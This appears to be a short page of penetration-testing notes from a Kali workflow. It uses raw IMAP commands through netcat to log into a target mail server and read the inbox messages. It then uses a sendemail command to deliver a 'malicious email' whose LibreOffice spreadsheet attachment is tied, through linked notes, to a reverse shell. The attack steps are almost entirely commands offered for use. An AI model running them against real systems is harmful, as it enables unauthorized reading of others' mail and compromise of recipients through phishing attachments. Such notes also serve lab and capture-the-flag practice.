#### Reading emails
```bash - kali
nc $TARGET 143
```

```bash - kali
tag login $USER@localhost $PASSWORD
```

```bash - kali
tag LIST "" "*"
```

```bash - kali
tag SELECT INBOX
```

Notice there are 5 total messages.

```bash - kali
tag STATUS INBOX (MESSAGES)
```

```bash - kali
tag fetch 1 (BODY[1])
```

We can read the rest of the messages with the following command:

```bash - kali
tag fetch 2:5 BODY[HEADER] BODY[1]
```

#### Send malicious email

Below, we are sending a malicious email with attachments from:
[[0._Reverse shells (WEB)#odt LibreOffice]]
OR
[[0._Reverse shells (WEB)#hta - ods LibreOffice]]

![[rlwrap]]

```bash - kali
sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s $TARGET:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a calc.ods
```




